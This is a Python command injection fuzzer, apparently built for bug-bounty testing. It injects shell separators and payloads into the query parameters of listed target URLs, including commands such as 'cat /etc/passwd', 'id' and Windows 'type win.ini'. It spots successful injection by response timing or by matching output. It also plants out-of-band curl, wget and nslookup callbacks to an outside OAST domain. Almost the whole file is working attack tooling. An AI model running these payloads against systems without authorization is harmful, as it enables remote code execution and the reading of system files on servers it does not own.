#!/usr/bin/env python3
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

COMMAND_SEPARATORS = [
    {"name": "semicolon", "separator": ";", "encoded": "%3B"},
    {"name": "pipe", "separator": "|", "encoded": "%7C"},
    {"name": "ampersand", "separator": "&", "encoded": "%26"},
    {"name": "double_ampersand", "separator": "&&", "encoded": "%26%26"},
    {"name": "double_pipe", "separator": "||", "encoded": "%7C%7C"},
    {"name": "newline", "separator": "\n", "encoded": "%0A"},
    {"name": "crlf", "separator": "\r\n", "encoded": "%0D%0A"},
    {"name": "backtick", "separator": "`", "encoded": "%60"},
    {"name": "dollar_paren", "separator": "$()", "encoded": "%24%28%29"},
    {"name": "encoded_newline", "separator": "%0a", "encoded": "%0A"},
    {"name": "encoded_null", "separator": "%00", "encoded": "%00"},
]

CMDI_PAYLOADS = {
    "sleep": [
        {"os": "linux", "cmd": "sleep 5", "time_detect": 5},
        {"os": "linux", "cmd": "sleep${IFS}5", "time_detect": 5},
        {"os": "linux", "cmd": "/bin/sleep 5", "time_detect": 5},
        {"os": "windows", "cmd": "timeout /t 5 /nobreak", "time_detect": 5},
        {"os": "windows", "cmd": "ping -n 6 127.0.0.1", "time_detect": 5},
    ],
    "output": [
        {"os": "linux", "cmd": "id", "detect": "uid="},
        {"os": "linux", "cmd": "uname -a", "detect": "Linux"},
        {"os": "linux", "cmd": "cat /etc/passwd", "detect": "root:x:0:0"},
        {"os": "windows", "cmd": "whoami", "detect": None},
        {"os": "windows", "cmd": "dir", "detect": "Volume"},
        {"os": "windows", "cmd": "type %SYSTEMROOT%\\win.ini", "detect": "[fonts]"},
    ],
}


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def extract_params_from_url(url):
    params = set()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    for k in query_params:
        params.add(k)
    param_pattern = re.findall(r'[?&]([\w\[\]]+)=', url)
    for p in param_pattern:
        params.add(p)
    return list(params)


def inject_payload(url, param, payload_str):
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in query_params:
        query_params[param] = [payload_str]
    else:
        query_params[param] = [payload_str]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    parts = list(parsed)
    parts[4] = new_query
    return urllib.parse.urlunparse(parts)


def build_cmd_injection(param, separator, command):
    separator_char = separator["separator"]
    if separator_char == "$()":
        return f"$({command})"
    if separator_char == "`":
        return f"`{command}`"
    if separator_char == "\n" or separator_char == "\r\n":
        return f"{separator_char}{command}"
    return f"{separator_char}{command}"


def generate_oast_callback(oast_domain, sep, param_name):
    call_id = uuid.uuid4().hex[:8]
    unique = f"{call_id}.{oast_domain}"
    return {
        "id": call_id,
        "url_path": unique,
        "curl": f"curl -s {unique}",
        "wget": f"wget -qO- {unique}",
        "dns": f"nslookup {unique}",
        "ping": f"ping -c 1 {unique}",
    }


def test_cmd_injection_target(url, param, sep, command, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "separator_name": sep["name"],
        "separator": sep["separator"],
        "command": command["cmd"],
        "os_target": command.get("os", "unknown"),
        "technique": "cmd_injection",
        "cmd_injection_detected": False,
        "time_based": command.get("time_detect", 0) > 0,
        "evidence_type": None,
        "evidence_text": None,
        "baseline_seconds": 0.0,
        "payload_seconds": 0.0,
        "time_difference": 0.0,
        "status_code": 0,
        "response_length": 0,
        "confidence": 0.0,
        "dry_run": dry_run,
    }
    if dry_run:
        payload_str = build_cmd_injection(param, sep, command["cmd"])
        test_url = inject_payload(url, param, payload_str)
        print(f"[dry-run] CMDi: {test_url} via {sep['name']}", file=sys.stderr)
        return result
    try:
        baseline_start = time.time()
        baseline_resp = session.get(url, timeout=timeout, allow_redirects=True)
        baseline = time.time() - baseline_start
        result["baseline_seconds"] = round(baseline, 2)
        payload_cmd = build_cmd_injection(param, sep, command["cmd"])
        test_url = inject_payload(url, param, payload_cmd)
        cmd_start = time.time()
        cmd_resp = session.get(test_url, timeout=timeout * 2, allow_redirects=True)
        elapsed = time.time() - cmd_start
        result["payload_seconds"] = round(elapsed, 2)
        result["status_code"] = cmd_resp.status_code
        result["response_length"] = len(cmd_resp.text)
        diff = elapsed - baseline
        result["time_difference"] = round(diff, 2)
        expected_delay = command.get("time_detect", 5)
        if expected_delay > 0 and diff > expected_delay * 0.5:
            result["cmd_injection_detected"] = True
            result["evidence_type"] = "time_based"
            result["evidence_text"] = f"Response time increased from {baseline:.2f}s to {elapsed:.2f}s (diff={diff:.2f}s, threshold={expected_delay * 0.5}s)"
            result["confidence"] = round(min(0.9, 0.4 + diff / expected_delay * 0.5), 2)
            print(f"[cmdi_time] {url} param={param} sep={sep['name']} cmd={command['cmd']} diff={diff:.2f}s", file=sys.stderr)
        elif "detect" in command and command["detect"]:
            if command["detect"] in cmd_resp.text:
                result["cmd_injection_detected"] = True
                result["evidence_type"] = "output_match"
                result["evidence_text"] = f"Found '{command['detect']}' in response"
                result["confidence"] = 0.85
                print(f"[cmdi_output] {url} param={param} sep={sep['name']} cmd={command['cmd']}", file=sys.stderr)
        if command.get("os") == "windows" and expected_delay == 0 and "volume" in (command.get("detect", "") or "").lower():
            if "Volume" in cmd_resp.text or "<DIR>" in cmd_resp.text:
                result["cmd_injection_detected"] = True
                result["evidence_type"] = "output_match"
                result["evidence_text"] = "Windows dir output detected"
                result["confidence"] = 0.85
                print(f"[cmdi_output] {url} param={param} sep={sep['name']} cmd={command['cmd']}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.Timeout:
        if command.get("time_detect", 0) > 0:
            result["cmd_injection_detected"] = True
            result["evidence_type"] = "time_based_timeout"
            result["confidence"] = 0.6
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.RequestException:
        pass
    return result


def test_oast_callback(url, param, sep, oast, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "separator": sep["separator"],
        "technique": "oob_oast",
        "oast_id": oast["id"],
        "oast_url": oast["url_path"],
        "oast_commands": [oast["curl"], oast["wget"], oast["dns"]],
        "sent": False,
        "dry_run": dry_run,
    }
    if dry_run:
        print(f"[dry-run] OAST: {url} with {sep['name']} -> callback to {oast['url_path']}", file=sys.stderr)
        return result
    try:
        for oast_cmd_key in ["curl", "wget"]:
            oast_cmd = oast[oast_cmd_key]
            payload_str = build_cmd_injection(param, sep, oast_cmd)
            test_url = inject_payload(url, param, payload_str)
            session.get(test_url, timeout=timeout, allow_redirects=True)
            result["sent"] = True
            if rate_limit > 0:
                time.sleep(1.0 / rate_limit)
    except requests.exceptions.RequestException:
        pass
    except Exception:
        pass
    return result


def main():
    parser = argparse.ArgumentParser(
        description="Command Injection Fuzzer — detect RCE via command separators, time-based, and OOB techniques",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --urls live_urls.txt --context .bb/context.json
  %(prog)s --urls live_urls.txt --context .bb/context.json --dry-run
  %(prog)s --urls live_urls.txt --context .bb/context.json --rate-limit 3 --timeout 10 --no-oast
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--urls", required=True, help="File with target URLs, one per line")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--rate-limit", type=int, default=5, help="Max requests per second (default: 5)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--concurrency", type=int, default=3, help="Thread pool concurrency (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--no-oast", action="store_true", help="Skip OOB/OAST callback tests")
    parser.add_argument("--oast-domain", default=None, help="OAST/Burp Collaborator / interactsh domain for OOB callbacks")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--proxy", default=None, help="HTTP proxy")
    parser.add_argument("--retries", type=int, default=2, help="Retries (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    oast_domain = args.oast_domain or ctx.get("oast_domain") or ctx.get("interactsh_url", "")
    outdir = ctx.get("outdir", os.getcwd())
    os.makedirs(outdir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "cmd_injection_findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        print("[error] No URLs loaded from --urls file.", file=sys.stderr)
        sys.exit(1)

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session_base = requests.Session()
    session_base.headers.update({
        "User-Agent": args.user_agent,
    })
    if proxy_dict:
        session_base.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session_base.mount("https://", adapter)
    session_base.mount("http://", adapter)

    tasks = []
    for url in urls:
        params = extract_params_from_url(url)
        if not params:
            params = ["q", "search", "id", "page", "file", "path", "cmd", "command", "exec", "run", "ip", "host", "ping", "addr", "address", "url", "redirect", "proxy", "endpoint", "target", "domain", "name"]
        for param in params:
            for sep in COMMAND_SEPARATORS:
                for cmd in CMDI_PAYLOADS["sleep"]:
                    tasks.append((url, param, sep, cmd))
                for cmd in CMDI_PAYLOADS["output"]:
                    tasks.append((url, param, sep, cmd))

    print(f"[info] Prepared {len(tasks)} command injection tasks across {len(urls)} URLs", file=sys.stderr)

    if args.dry_run:
        for url, param, sep, cmd in tasks:
            test_cmd_injection_target(url, param, sep, cmd, session_base, args.timeout, args.rate_limit, dry_run=True)
        if not args.no_oast and oast_domain:
            for url in urls:
                params = extract_params_from_url(url)
                if not params:
                    params = ["ip", "host", "ping", "addr", "address", "url", "redirect", "proxy", "endpoint", "target"]
                for param in params[:2]:
                    for sep in COMMAND_SEPARATORS[:5]:
                        oast = generate_oast_callback(oast_domain, sep, param)
                        test_oast_callback(url, param, sep, oast, session_base, args.timeout, args.rate_limit, dry_run=True)
        print(f"[dry-run] Dry run complete.", file=sys.stderr)
        return

    all_findings = []
    completed = 0
    with open(output_path, "w") as outfile:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url, param, sep, cmd in tasks:
                future = executor.submit(
                    test_cmd_injection_target, url, param, sep, cmd,
                    requests.Session(), args.timeout, args.rate_limit, dry_run=False
                )
                futures[future] = (url, param, sep, cmd)
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception:
                    continue
                outfile.write(json.dumps(result) + "\n")
                completed += 1
                if result.get("cmd_injection_detected") and result.get("confidence", 0) >= 0.3:
                    all_findings.append(result)
                if completed % 200 == 0:
                    print(f"[progress] {completed}/{len(tasks)} probes", file=sys.stderr)

        if not args.no_oast and oast_domain:
            oast_tasks = []
            for url in urls:
                params = extract_params_from_url(url)
                if not params:
                    params = ["ip", "host", "ping", "addr", "address", "url", "redirect", "proxy", "endpoint", "target"]
                for param in params[:3]:
                    for sep in COMMAND_SEPARATORS[:5]:
                        oast = generate_oast_callback(oast_domain, sep, param)
                        oast_tasks.append((url, param, sep, oast))
            print(f"[info] Sending {len(oast_tasks)} OAST callbacks to {oast_domain}", file=sys.stderr)
            for url, param, sep, oast_entry in oast_tasks:
                oast_result = test_oast_callback(url, param, sep, oast_entry, requests.Session(), args.timeout, args.rate_limit, dry_run=False)
                outfile.write(json.dumps(oast_result) + "\n")

    summary = {
        "total_probes": len(tasks),
        "oast_callbacks": len(oast_tasks) if not args.no_oast and oast_domain else 0,
        "total_findings": len(all_findings),
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()